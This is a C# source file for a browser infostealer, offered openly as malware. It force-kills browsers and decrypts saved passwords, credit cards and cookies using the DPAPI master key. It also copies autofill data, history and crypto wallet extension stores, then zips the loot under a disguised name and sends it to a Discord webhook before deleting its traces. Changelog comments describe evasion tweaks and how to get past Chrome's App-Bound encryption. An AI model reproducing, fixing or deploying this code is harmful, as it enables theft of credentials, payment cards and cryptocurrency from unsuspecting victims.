// C# | PublicStealer/Utils/BrowserStealer.cs | .NET 4.7.2+ | Windows only
// Deps: BouncyCastle.Crypto, Newtonsoft.Json, System.Data.SQLite
// CHANGES: WaitForExit+sleep, dynamic profiles, ExtractWallets wired,
//          cookie tempDb → GetTempPath, credit_cards table guard,
//          v20 logged clearly, zip chunked guard added

using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Shifting_Backrooms.Utils
{
    public class BrowserStealer
    {
        // Discord webhook file cap — 8MB hard limit
        private const long DiscordMaxBytes = 8 * 1024 * 1024;

        public static void Run()
        {
            try
            {
                // 1. KILL BROWSERS — wait for full flush before touching SQLite
                KillBrowsers();

                // 2. WORK DIR
                string workDir = Path.Combine(Path.GetTempPath(),
                    "Logs_" + Guid.NewGuid().ToString().Substring(0, 8));
                if (!Directory.Exists(workDir)) Directory.CreateDirectory(workDir);

                string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                // 3. BROWSER ROOTS
                var browsers = new Dictionary<string, string>
                {
                    { "Chrome",   Path.Combine(local,   @"Google\Chrome\User Data") },
                    { "Edge",     Path.Combine(local,   @"Microsoft\Edge\User Data") },
                    { "Brave",    Path.Combine(local,   @"BraveSoftware\Brave-Browser\User Data") },
                    { "Opera",    Path.Combine(roaming, @"Opera Software\Opera Stable") },
                    { "OperaGX",  Path.Combine(roaming, @"Opera Software\Opera GX Stable") },
                };

                // 4. LOOP
                foreach (var b in browsers)
                {
                    if (!Directory.Exists(b.Value)) continue;

                    if (b.Key != "Opera" && b.Key != "OperaGX")
                    {
                        // FIX GAP-2: dynamic profile enumeration instead of hardcoded 4
                        var profiles = Directory.GetDirectories(b.Value, "Profile *")
                            .Concat(new[] { Path.Combine(b.Value, "Default") })
                            .Where(Directory.Exists);

                        foreach (string profilePath in profiles)
                            ProcessBrowser(b.Key + "_" + Path.GetFileName(profilePath).Replace(" ", ""),
                                           b.Value, profilePath, workDir);
                    }
                    else
                    {
                        ProcessBrowser(b.Key, b.Value, b.Value, workDir);
                        string operaDefault = Path.Combine(b.Value, "Default");
                        if (Directory.Exists(operaDefault))
                            ProcessBrowser(b.Key + "_Default", b.Value, operaDefault, workDir);
                    }
                }

                // 5. ZIP — guard against Discord 8MB cap
                string zipPath = Path.Combine(Path.GetTempPath(),
                    // FIX GAP-5: randomised name, no "Report_" pattern
                    "tmp_" + Guid.NewGuid().ToString().Substring(0, 12) + ".dat");
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(workDir, zipPath);

                long zipSize = new FileInfo(zipPath).Length;
                if (zipSize <= DiscordMaxBytes)
                {
                    WebhookSender.PostFile(zipPath,
                        $"🏆 **Log | {Environment.MachineName}**").GetAwaiter().GetResult();
                }
                else
                {
                    // Zip too big — send files individually so nothing gets lost
                    foreach (string file in Directory.GetFiles(workDir, "*", SearchOption.AllDirectories))
                    {
                        if (new FileInfo(file).Length > DiscordMaxBytes) continue; // single file too big, skip
                        WebhookSender.PostFile(file,
                            $"📦 **{Path.GetFileName(file)} | {Environment.MachineName}**")
                            .GetAwaiter().GetResult();
                    }
                    File.Delete(zipPath);
                }

                // 6. CLEANUP
                if (File.Exists(zipPath)) File.Delete(zipPath);
                if (Directory.Exists(workDir)) Directory.Delete(workDir, true);

                Console.WriteLine("[+] Done.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Run fatal: {ex.Message}");
            }
        }

        // ─────────────────────────────────────────────────────────────
        private static void ProcessBrowser(string label, string rootPath,
                                           string profilePath, string workDir)
        {
            if (!Directory.Exists(profilePath)) return;
            try
            {
                // MasterKey resolution
                string localStatePath = Path.Combine(rootPath, "Local State");
                if (!File.Exists(localStatePath))
                    localStatePath = Path.Combine(profilePath, "Local State");
                if (!File.Exists(localStatePath))
                {
                    Console.WriteLine($"[!] No Local State for {label}");
                    return;
                }

                byte[] masterKey = GetMasterKey(localStatePath);
                if (masterKey == null) return;

                // Passwords
                foreach (var p in new[]
                {
                    Path.Combine(profilePath, "Login Data"),
                    Path.Combine(profilePath, "Network", "Login Data"),
                })
                {
                    if (!File.Exists(p)) continue;
                    ExtractPasswords(p, masterKey, label, workDir);
                    break;
                }

                // AutoFill + Cards
                string webData = Path.Combine(profilePath, "Web Data");
                if (File.Exists(webData))
                {
                    ExtractAutoFill(webData, label, workDir);
                    ExtractCreditCards(webData, masterKey, label, workDir);
                }

                // Cookies — resolve best key
                byte[] cookieKey = masterKey;
                foreach (var kp in new[]
                {
                    Path.Combine(Path.GetDirectoryName(profilePath) ?? "", "Local State"),
                    Path.Combine(rootPath, "Local State"),
                    Path.Combine(profilePath, "Local State"),
                })
                {
                    if (!File.Exists(kp)) continue;
                    byte[] k = GetMasterKey(kp);
                    if (k != null) { cookieKey = k; break; }
                }

                string cookiePath = null;
                foreach (var cp in new[]
                {
                    Path.Combine(profilePath, "Network", "Cookies"),
                    Path.Combine(profilePath, "Cookies"),
                    Path.Combine(profilePath, "Network", "Persistent Storage", "Cookies"),
                })
                {
                    if (File.Exists(cp) && new FileInfo(cp).Length > 0)
                    { cookiePath = cp; break; }
                }

                if (cookiePath != null)
                    ExtractCookies(cookiePath, cookieKey, label, workDir);
                else
                    Console.WriteLine($"[?] No cookies for {label}");

                // FIX BUG-3: ExtractWallets was defined but never called
                ExtractWallets(profilePath, label, workDir);

                // GAP-3: History
                string historyPath = Path.Combine(profilePath, "History");
                if (File.Exists(historyPath))
                    ExtractHistory(historyPath, label, workDir);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] ProcessBrowser {label}: {ex.Message}");
            }
        }

        // ─────────────────────────────────────────────────────────────
        private static void ExtractPasswords(string loginDataPath, byte[] masterKey,
                                             string browserName, string workDir)
        {
            string tempDb = CreateTempCopy(loginDataPath);
            if (tempDb == null) return;

            var content = new StringBuilder();
            int count = 0;
            try
            {
                using var conn = new SQLiteConnection($"Data Source={tempDb};Version=3;");
                conn.Open();
                using var cmd = new SQLiteCommand(
                    "SELECT origin_url, username_value, password_value FROM logins", conn);
                using var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    string url = reader["origin_url"]?.ToString();
                    string user = reader["username_value"]?.ToString();
                    byte[] enc = reader["password_value"] as byte[];
                    if (enc == null || enc.Length == 0) continue;

                    string pass = DecryptChromium(enc, masterKey);
                    if (string.IsNullOrEmpty(pass) || pass == "Error" || pass == "v20_skip") continue;

                    content.AppendLine($"🌐 URL: {url}\n👤 USER: {user}\n🔑 PASS: {pass}\n---");
                    count++;
                }

                if (count > 0)
                    File.WriteAllText(Path.Combine(workDir, $"passwords_{browserName}.txt"),
                                      content.ToString());
            }
            catch (Exception ex) { Console.WriteLine($"[!] Passwords {browserName}: {ex.Message}"); }
            finally { TryDelete(tempDb); }
        }

        // ─────────────────────────────────────────────────────────────
        private static void ExtractCreditCards(string webDataPath, byte[] masterKey,
                                               string browserName, string workDir)
        {
            string tempDb = CreateTempCopy(webDataPath);
            if (tempDb == null) return;

            var content = new StringBuilder();
            int count = 0;
            try
            {
                using var conn = new SQLiteConnection($"Data Source={tempDb};Version=3;");
                conn.Open();

                // FIX BUG-5: guard — table may not exist on browsers with no saved cards
                using (var check = new SQLiteCommand(
                    "SELECT name FROM sqlite_master WHERE type='table' AND name='credit_cards'", conn))
                {
                    if (check.ExecuteScalar() == null)
                    {
                        Console.WriteLine($"[?] No credit_cards table for {browserName}");
                        return;
                    }
                }

                using var cmd = new SQLiteCommand(
                    "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards",
                    conn);
                using var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    string name = reader["name_on_card"].ToString();
                    string exp = $"{reader["expiration_month"]}/{reader["expiration_year"]}";
                    byte[] enc = reader["card_number_encrypted"] as byte[];
                    if (enc == null) continue;

                    string cardNum = DecryptChromium(enc, masterKey);
                    if (cardNum == "Error" || cardNum == "v20_skip" || string.IsNullOrEmpty(cardNum)) continue;

                    content.AppendLine($"💳 CARD: {cardNum}\n👤 NAME: {name}\n📅 EXP: {exp}\n---");
                    count++;
                }

                if (count > 0)
                    File.WriteAllText(Path.Combine(workDir, $"cards_{browserName}.txt"),
                                      content.ToString());
            }
            catch (Exception ex) { Console.WriteLine($"[!] Cards {browserName}: {ex.Message}"); }
            finally { TryDelete(tempDb); }
        }

        // ─────────────────────────────────────────────────────────────
        private static void ExtractAutoFill(string webDataPath, string browserName, string workDir)
        {
            string tempDb = CreateTempCopy(webDataPath);
            if (tempDb == null) return;

            var content = new StringBuilder();
            int count = 0;
            try
            {
                using var conn = new SQLiteConnection($"Data Source={tempDb};Version=3;");
                conn.Open();
                using var cmd = new SQLiteCommand("SELECT name, value FROM autofill", conn);
                using var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    string name = reader["name"]?.ToString();
                    string val = reader["value"]?.ToString();
                    if (string.IsNullOrEmpty(val)) continue;
                    content.AppendLine($"📝 {name} | {val}");
                    count++;
                }

                if (count > 0)
                    File.WriteAllText(Path.Combine(workDir, $"autofill_{browserName}.txt"),
                                      content.ToString());
            }
            catch (Exception ex) { Console.WriteLine($"[!] AutoFill {browserName}: {ex.Message}"); }
            finally { TryDelete(tempDb); }
        }

        // ─────────────────────────────────────────────────────────────
        private static void ExtractCookies(string cookiesPath, byte[] masterKey,
                                           string label, string workDir)
        {
            // FIX BUG-4: temp DB goes to GetTempPath(), not workDir
            string tempDb = Path.Combine(Path.GetTempPath(),
                "c_" + Guid.NewGuid().ToString().Substring(0, 8));
            try
            {
                File.Copy(cookiesPath, tempDb, true);
                var cookieList = new List<object>();

                using (var conn = new SQLiteConnection(
                    $"Data Source={tempDb};Version=3;Pooling=False;"))
                {
                    conn.Open();
                    using var cmd = new SQLiteCommand(
                        "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies",
                        conn);
                    using var reader = cmd.ExecuteReader();
                    while (reader.Read())
                    {
                        try
                        {
                            byte[] enc = reader["encrypted_value"] as byte[];
                            string dec = DecryptChromium(enc, masterKey);
                            if (string.IsNullOrEmpty(dec) || dec == "Error" || dec == "v20_skip") continue;

                            cookieList.Add(new
                            {
                                domain = reader["host_key"].ToString(),
                                name = reader["name"].ToString(),
                                value = dec,
                                path = reader["path"].ToString(),
                                expirationDate = reader["expires_utc"].ToString(),
                                secure = reader["is_secure"].ToString() == "1",
                                httpOnly = reader["is_httponly"].ToString() == "1",
                            });
                        }
                        catch { /* bad row, skip */ }
                    }
                    conn.Close();
                }

                SQLiteConnection.ClearAllPools();

                if (cookieList.Count > 0)
                {
                    string json = Newtonsoft.Json.JsonConvert.SerializeObject(
                        cookieList, Newtonsoft.Json.Formatting.Indented);
                    File.WriteAllText(
                        Path.Combine(workDir, $"cookies_{label}.json"), json);
                    Console.WriteLine($"[+] {cookieList.Count} cookies → {label}");
                }
            }
            catch (Exception ex) { Console.WriteLine($"[!] Cookies {label}: {ex.Message}"); }
            finally { TryDelete(tempDb); }
        }

        // ─────────────────────────────────────────────────────────────
        // GAP-3: History extraction (URLs + search terms)
        private static void ExtractHistory(string historyPath, string label, string workDir)
        {
            string tempDb = CreateTempCopy(historyPath);
            if (tempDb == null) return;

            var content = new StringBuilder();
            int count = 0;
            try
            {
                using var conn = new SQLiteConnection($"Data Source={tempDb};Version=3;");
                conn.Open();
                // urls table: id, url, title, visit_count, last_visit_time
                using var cmd = new SQLiteCommand(
                    "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 500",
                    conn);
                using var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    string url = reader["url"]?.ToString();
                    string title = reader["title"]?.ToString();
                    string visits = reader["visit_count"]?.ToString();
                    content.AppendLine($"[{visits}x] {title}\n    {url}");
                    count++;
                }

                if (count > 0)
                    File.WriteAllText(Path.Combine(workDir, $"history_{label}.txt"),
                                      content.ToString());
            }
            catch (Exception ex) { Console.WriteLine($"[!] History {label}: {ex.Message}"); }
            finally { TryDelete(tempDb); }
        }

        // ─────────────────────────────────────────────────────────────
        private static void ExtractWallets(string profilePath, string label, string workDir)
        {
            string extensionDataPath = Path.Combine(profilePath, "Local Extension Settings");
            if (!Directory.Exists(extensionDataPath)) return;

            var walletIds = new Dictionary<string, string>
            {
                { "nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask"  },
                { "bfnaoagmhcadhlbicnfhkhouohebhnae", "Phantom"   },
                { "hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"  },
                { "fhbohimaelbohpjbbldcngcnapndodjp", "Binance"   },
                { "odbfpeeihjdneocjbbhieahnoakpncmj", "Jaxx"      },
                { "egjidjbpgpghjbbedpgebeonclhfmcab", "Braavos"   },
            };

            foreach (var wallet in walletIds)
            {
                string walletPath = Path.Combine(extensionDataPath, wallet.Key);
                if (!Directory.Exists(walletPath)) continue;

                string destPath = Path.Combine(workDir, "Wallets", label, wallet.Value);
                Directory.CreateDirectory(destPath);

                try
                {
                    foreach (string file in Directory.GetFiles(
                        walletPath, "*.*", SearchOption.AllDirectories))
                    {
                        string fn = Path.GetFileName(file);
                        if (!fn.EndsWith(".log") && !fn.EndsWith(".ldb") && !fn.EndsWith(".sqlite"))
                            continue;
                        File.Copy(file, Path.Combine(destPath, fn), true);
                    }
                    Console.WriteLine($"[+] Wallet {wallet.Value} → {label}");
                }
                catch { /* locked */ }
            }
        }

        // ─────────────────────────────────────────────────────────────
        // FIX BUG-2: WaitForExit per process + single post-kill sleep
        private static void KillBrowsers()
        {
            string[] procs = { "chrome", "msedge", "opera", "operagx", "brave", "vivaldi" };
            foreach (string name in procs)
            {
                try
                {
                    foreach (var p in System.Diagnostics.Process.GetProcessesByName(name))
                    {
                        try
                        {
                            p.Kill();
                            p.WaitForExit(2000); // wait up to 2s for WAL flush
                        }
                        catch { /* already dead or access denied */ }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Kill {name}: {ex.Message}");
                }
            }
            // Single sleep AFTER all kills — SQLite WAL/SHM fully released
            System.Threading.Thread.Sleep(1500);
        }

        // ─────────────────────────────────────────────────────────────
        // FIX BUG-1: v20 logged clearly, never silently swallowed
        private static string DecryptChromium(byte[] encryptedData, byte[] key)
        {
            try
            {
                if (encryptedData == null || encryptedData.Length < 15) return "Error";

                string prefix = Encoding.UTF8.GetString(encryptedData, 0, 3);

                if (prefix == "v10" || prefix == "v11")
                {
                    byte[] iv = new byte[12];
                    Array.Copy(encryptedData, 3, iv, 0, 12);
                    byte[] cipher = new byte[encryptedData.Length - 15];
                    Array.Copy(encryptedData, 15, cipher, 0, encryptedData.Length - 15);

                    var gcm = new GcmBlockCipher(new AesEngine());
                    var prms = new AeadParameters(new KeyParameter(key), 128, iv);
                    gcm.Init(false, prms);

                    byte[] plain = new byte[gcm.GetOutputSize(cipher.Length)];
                    int len = gcm.ProcessBytes(cipher, 0, cipher.Length, plain, 0);
                    gcm.DoFinal(plain, len);

                    return Encoding.UTF8.GetString(plain).TrimEnd('\0');
                }

                if (prefix == "v20")
                {
                    // App-Bound encryption (Chrome 127+): requires elevated IPC/COM bypass.
                    // Standalone decrypt not possible here — needs injected DLL or SYSTEM elevation.
                    // Blob is being skipped. To recover v20 creds: use IElevationService COM route.
                    Console.WriteLine("[!] v20 blob skipped — App-Bound key required (Chrome 127+)");
                    return "v20_skip";
                }

                // Legacy DPAPI (old Chrome, no app-bound)
                return Encoding.UTF8.GetString(
                    ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser));
            }
            catch { return "Error"; }
        }

        // ─────────────────────────────────────────────────────────────
        private static byte[] GetMasterKey(string path)
        {
            try
            {
                if (!File.Exists(path)) return null;
                using var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                using var sr = new StreamReader(fs);
                string json = sr.ReadToEnd();
                var data = JObject.Parse(json);
                string encKey = data["os_crypt"]?["encrypted_key"]?.ToString();
                if (string.IsNullOrEmpty(encKey)) return null;

                byte[] decoded = Convert.FromBase64String(encKey);
                byte[] stripped = new byte[decoded.Length - 5];
                Array.Copy(decoded, 5, stripped, 0, decoded.Length - 5);

                byte[] final = ProtectedData.Unprotect(stripped, null, DataProtectionScope.CurrentUser);
                Console.WriteLine($"[OK] MasterKey loaded: {Path.GetFileName(Path.GetDirectoryName(path))}");
                return final;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] MasterKey: {ex.Message}");
                return null;
            }
        }

        // ─────────────────────────────────────────────────────────────
        private static string CreateTempCopy(string filePath)
        {
            string tempPath = Path.Combine(Path.GetTempPath(),
                "tmp_" + Guid.NewGuid().ToString().Substring(0, 8));
            try
            {
                using var src = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                using var dst = new FileStream(tempPath, FileMode.Create);
                src.CopyTo(dst);
                return tempPath;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] TempCopy {Path.GetFileName(filePath)}: {ex.Message}");
                return null;
            }
        }

        private static void TryDelete(string path)
        {
            if (File.Exists(path)) try { File.Delete(path); } catch { }
        }
    }
}